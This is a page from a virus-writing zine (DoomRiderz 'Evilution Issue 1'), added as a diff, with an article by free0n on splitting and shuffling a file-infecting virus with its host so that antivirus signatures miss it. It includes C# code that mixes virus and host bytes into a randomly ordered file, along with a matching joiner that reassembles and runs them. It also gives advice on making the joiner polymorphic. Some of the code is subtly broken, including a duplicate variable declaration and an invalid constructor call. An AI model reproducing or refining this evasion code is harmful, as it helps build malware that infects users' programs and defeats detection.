@@ -1,0 +1,339 @@
+<html>
+<head>
+<title>Doom Riderz - Evilution Issue 1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="../doom.css">
+<script type="text/javascript" src="../fader.js"></script>
+</head>
+<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+    <br>
+	<div id="viewerText">
+		<div id="viewerTextHeader"><a href="#">File Splitting and Joining In Viruses by free0n</a></div>
+		<pre>
+		<!--- put article/source here --->
+/*******************************************************************************
+================================================================================
+		       File Mixing and Jumbling In Viruses		     		      		    		       		    
+                             by free0n/[DoomRiderz]                              
+================================================================================
+*******************************************************************************/
+INDEX:
+0) Introduction
+
+1) How it works
+
+2) The Mixing
+
+3) The Jumbling
+
+4) Conclusion
+
+
+
+
+
+0) Introduction
+
+   This article is a introduction to a technique known as file mixing. The
+   idea is based on a concept of dynamically splitting the file into random
+   sections and joining the code back for a successful execution. The technique
+   is meant to be used as a stealth tactic that can be used most effectively for
+   file infection viruses. This concept is mostly an idea but it is possible and
+   has been done before.
+
+
+
+
+
+1) How it works
+
+   The mixing and jumbling is a pretty basic concept and very effective the 
+   idea is that you have you have your virus split itself into many small 
+   sections these small sections are then jumbled or scrambled. Keeping any 
+   identification of a signature or position of a signature almost impossible to 
+   find.
+
+   For example we have a prepender virus. Prepender viruses work by putting
+   the code or executable portion at the first part of the file. So when the
+   file is launched the virus is executed, the virus runs and then reads itself
+   and launches the original program it's attached to.
+
+   Figure 1.         Figure 2.      Figure 3.
+   -=========-       -=========-    -=========-
+   |  virus  |       | joiner  |    | joiner  |
+   -=========-       -=========-    -=========-
+   |  host   |       | virus   |    |  virus  |
+   -=========-       -=========-    |   +     |
+                                    |  host   |
+                                    -=========-
+ 
+   Now this basically works by having the virus when ran, search for suitable 
+   files that can be infected. So in our example of the prepender we will have
+   it infect executable files in the current directory. The virus then instead 
+   of automatically inserting it's code at the top. Splits the file into small
+   sections. The virus then does the same thing. Once it's split it can randomly
+   sort the bytes into an order that can be randomly chosen. Depending on the
+   size of the file will depend on how many different splits you can do. Once 
+   the virus and the host are split and randomly sorted they are mixed in a 
+   random order and encrypted and written to a temporary file. 
+
+   So what the expected result will look like will be something like this:
+  
+   Figure 4.
+   [ virus]    or   [  host ]            
+   [ host ]         [  host ]                               [   joiner  ]
+   [ virus]         [ virus ]   becomes  [ virus + host ] = [ virus+host]
+   [ host ]         [  host ]
+   [ virus]         [ virus ]
+   [ host ]         [ virus ]
+
+   The outcome of the different sections and where are chosen at random. The
+   point of which is to make them scrambled. The temporary file which we created 
+   is then merged to the original file that the virus is infecting. 
+
+   The second part is writing the joiner application.The joiner is the part that
+   knows what parts belong to the virus and which parts belong to the host. It 
+   also has to have the ability to decrypt the binary data in the file and be
+   polymorphic. Which means that no variables in the joiner should be the
+   same, method or function names should change, the body should change and if
+   possible make sure that code used in the joiner either takes names of common
+   variable names or the data is encrypted each time. If you can't make the 
+   joiner application undetectable it's sure not going to with stand av. 
+   They may not be able to find a signature on your virus but they will find a 
+   signature on your joiner if you aren't careful.
+
+
+
+
+
+   2) The Mixing
+
+   Below I will demonstrate a method that can split the file and the host and
+   will write our temporary executable. The method Split is passed two byte
+   arrays which contain the bytes of the executable to be infected (hostByte)
+   and the bytes of the virus (myBytes). We use the variable b to generate a 
+   random 16 number. Then divide it based on the file size. This should get us
+   the size of each block like in Figure 4 [virus][host][virus]. 
+
+   The next part is deciding which order they should be split and rejoined this 
+   order is kept in a string variable called "sequence" that we will write to 
+   our joiner. This and the variable int b are very important. Without it we 
+   will not be able to join the file and tell which part is what.
+
+   private string Split(byte[] hostByte, byte[]myBytes) 
+   {
+	
+	int b = RandSixTeen(hostByte.Length);
+        
+   	//calculate how much to write each block
+        int hblocksize = (hostByte.Length / b);
+        int vblocksize = (myBytes.Length / b);
+
+        //decide the sequence
+   	ArrayList arrShuffled  = ShuffleArrayList((b * 2));
+
+        int i = 0;
+        IEnumerator enumr = arrShuffled.GetEnumerator();
+        string sequence = "";
+
+        int av = 0;
+        int ah = 0;
+
+        int ev = vblocksize;
+        int eh = hblocksize;
+        
+        string cmbName = myDir + slash + RandomWords() + ".exe";
+        string sequence = "";
+        FileStream fswHost = new FileStream(cmbName, FileMode.Create, FileAccess.Write);
+        BinaryWriter bwHost = new BinaryWriter(fswHost);
+
+	//we are going to loop through the array list and depending if the
+        //the current value in the arraylist is 1 or 0 write the different parts
+        //out. If it's 0 then we write the host, if it's 1 we write the virus 
+
+	while (enumr.MoveNext())
+        {
+           if (enumr.Current.Equals(1))
+           {
+              for (int j = av; j < ev; j++)
+              {
+                 bwHost.BaseStream.WriteByte(myBytes[j]);
+              }
+              av = ev;
+              ev = ev + vblocksize;
+           }
+           else
+           {
+              for (int j = ah; j < eh; j++)
+              {
+                 bwHost.BaseStream.WriteByte(hostByte[j]);
+              }
+              ah = eh;
+              eh = eh + hblocksize;
+           }
+           sequence += enumr.Current;
+           i++;
+        }
+
+        fswHost.Flush();
+        bwHost.Flush();
+        bwHost.Close();
+        fswHost.Close();
+
+	return sequence;
+   }
+
+
+   private int RandSixTeen(int s)
+   {
+	int[] intArr = new int[64];
+	int l = 63;
+	for (int i = 0; i < intArr.Length; i++)
+	{
+	   intArr[i] = 16 * (i + 1);
+	   if (intArr[i] > s) {
+	        l = i - 1;
+	        break;
+	   }
+	}
+	Random r = new Random();
+	return intArr[r.Next(0, l)];
+   }
+
+   private ArrayList ShuffleArrayList(int n)
+   {
+	//create an array list
+	ArrayList arrList = new ArrayList();
+	for (int i = 0; i < n; i++)
+	{
+	   if ((i % 2) == 0)
+	   {
+	      arrList.Add(0);
+	   }
+	   else
+	   {
+	      arrList.Add(1);
+	   }
+	}
+
+	//randomly sort the arraylist then return it
+	Random rnd = new Random();
+	for (int inx = arrList.Count - 1; inx > 0; --inx)
+	{
+   	   int pos = rnd.Next(inx);
+	   object temp = arrList[inx];
+	   arrList[inx] = arrList[pos];
+	   arrList[pos] = temp;
+	}
+	return arrList;
+   }
+
+   Once the temporary file is written and created we can then merge it into the
+   host file. The next step is writing the joiner which we will place at the top
+   of the host file. So in the end it will look like Figure 4. 
+
+
+
+
+
+   3) The Jumbling
+
+   The joining of two files is not that tricky. We are basically just reversing 
+   the alogrithm we used to join the two files. And instead of reading we are 
+   writing. We have to know 2 things. Which part is the virus and host, and how 
+   big are each block in the sequence. Luckly we saved our sequence and sequence 
+   size in our variables.
+
+   our sequence should look something like this:
+
+   string sequence = "01010101010100001010111100101";
+
+   a bunch of random 0's and 1's order in a weird way that should never be the 
+   same length or in the same order. The chance of that happening is extremely 
+   low. Now I won't go over the whole decryption and writing the joiner because
+   depending on your programming language that will be a different approach. The
+   reason why I use C# in this is because it's pretty obvious to read and under
+   stand whats going on even if you've never coded C#.. 
+
+   We have 1 method that gets passed four variables. One which is the sequence 
+   and the other which is the size of blocks. We have two byte arrays that will 
+   store the virus or the host bytes. When the sequence loop is done all we have 
+   to do is write the virus and the original program back out and execute it. 
+
+   private void Join(string sequence, int b, int mySize, int fileSize)
+   {
+	FileStream fs = new FileStream(file);
+        BinaryReader br = new BinaryReader(fs);
+	CharEnumerator ce = sequence.GetEnumerator();
+	
+        int blocks = (b / 2); 
+        int hlength = (fileSize / blocks); 
+        int vlength = (mySize / blocks); 
+
+        byte[] hostBytes = new byte[hlength]; 
+        byte[] virBytes = new byte[vlength]; 
+
+	int vcount = 0; 
+	int hcount = 0; 
+
+	int vsize = vlength; 
+	int hsize = hlength; 
+
+        while(ce.MoveNext()) 
+        {
+	    if(ce.Current.Equals('1')) 
+            {
+               for(int f = vcount; f < vsize; f++)
+               {
+                  virBytes[f] = br.ReadByte(); 
+               }
+	       vcount = vsize; 
+	       vsize = vsize + vlength; 
+            } 
+            else 
+            {
+               for(int f = hcount; f < hsize; f++)
+               {
+                  hostBytes[f] = br.ReadByte(); 
+               }
+               hcount = hsize; 
+	       hsize = hsize + hlength; 
+            }
+        }
+        br.Close(); 
+        fs.Close();  
+   }
+  
+
+   The joiner then has both of the contents and can write out the byte arrays.
+   First writing and executing the virus. Then when the virus is done executing
+   the host to make sure the application doesn't get reinfected. After that the
+   temporary files are deleted and everything completes.
+
+
+
+
+
+   4) Conclusion
+
+   At the time of writing this article. I have made a more full example of this
+   method in a polymorphic virus called Baldr. The virus maybe confusing at
+   first but it has almost the exact same code and technique for file splitting.
+ 
+   Another idea to take this further is maybe hiding different portions of virus 
+   code in other files, making the code available on the Internet and performing 
+   get requests, or maybe finding new ways to compress the joiners.
+
+    ``Thus spake the master programmer:
+    A well-written program is its own heaven; a poorly-written program is its 
+    own hell.''  - Tao
+
+   free0n - DoomRiderz
+   http://free0n.host.sk
+   phree0n@hotmail.com
+   01/01/2007 (Happy New Year!)
+
+	</pre>
+   </div>
+</body>
+</html>
